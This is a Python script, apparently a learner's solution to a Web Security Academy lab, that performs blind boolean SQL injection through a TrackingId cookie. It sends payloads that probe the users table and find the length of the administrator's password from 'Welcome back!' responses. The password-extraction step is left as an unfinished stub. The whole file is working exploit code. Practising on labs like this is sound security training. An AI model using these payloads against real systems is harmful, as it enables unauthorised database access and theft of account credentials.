import string
import requests
import sys

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}


def fire_payload(cookies, url):
    # print(cookies)
    if "Welcome back!" in requests.get(url=url, cookies=cookies).text:
    # if "Welcome back!" in requests.get(url=url, cookies=cookies, proxies=proxies).text:
        return True


def username(cookies, url):
    for char in string.ascii_lowercase:
        payload = f"' AND ( SELECT '{char}' from users LIMIT 1) = '{char}"
        cookies['TrackingId'] = cookies['TrackingId'] + payload
        if fire_payload(cookies, url):
            print(f"[+] Username = {char}")
            return True


def pw_take(url, cookies, length):
    for i in range(length):
        print(i)


def pw_length(url, cookies):
    for i in range(1, 50):
        payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"
        temp_cookies = cookies.copy()
        temp_cookies['TrackingId'] += payload
        if not fire_payload(temp_cookies, url):
            return i


if __name__ == "__main__":
    try:
        # url = sys.argv[1].strip()
        url = "https://ac391f6e1f704cd380f61b22004d00eb.web-security-academy.net/"
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
        sys.exit(-1)
    s = requests.Session().get(url=url)
    cookies = s.cookies.get_dict()

    num = pw_length(url, cookies)
    if num:
        print("[+] Blind Sqli Successful!")
        print(f"[+] Password Length = {num}")
        print("[+] Getting the Password")
        pw_take(url, cookies, num)
    else:
        print("[-] Blind Sqli Failed!")
